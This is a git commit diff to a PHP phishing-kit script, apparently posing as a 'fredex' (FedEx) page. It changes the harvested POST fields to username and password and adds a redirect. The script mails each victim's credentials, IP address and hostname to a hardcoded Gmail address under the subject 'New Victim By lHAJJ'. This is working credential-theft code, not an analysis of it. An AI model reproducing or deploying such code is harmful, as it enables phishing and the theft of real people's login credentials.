0a83648008e0d585ca06e0d460c0c573e7c7c8d8
Join-the-chat <136692132+Join-the-chat@users.noreply.github.com>
2025-10-26 02:10:45 +0200

    Update POST variable names in emailrslt.php

--- emailrslt.php
+++ emailrslt.php
@@ -2,8 +2,8 @@
 $ip = getenv("REMOTE_ADDR");
 $message .= "-------------------- fredex -------------------\n";
 $message .= "--------------  Infos -------------\n";
-$message .= "prenomNom       : ".$_POST['identifier']."\n";
-$message .= "Nom      : ".$_POST['juan']."\n";
+$message .= "prenomNom       : ".$_POST['username']."\n";
+$message .= "Nom      : ".$_POST['password']."\n";
 $message .= "-------------- IP Infos ------------\n";
 $message .= "IP      : $ip\n";
 $message .= "HOST    : ".gethostbyaddr($ip)."\n";
@@ -13,4 +13,5 @@ $send = "laouziazzedine@gmail.com ";
 $subject = "New Victim By lHAJJ ";
 $headers = "pedro";  
 mail($send,$subject,$message,$headers);
+header("Location:../fin.html");
 ?>
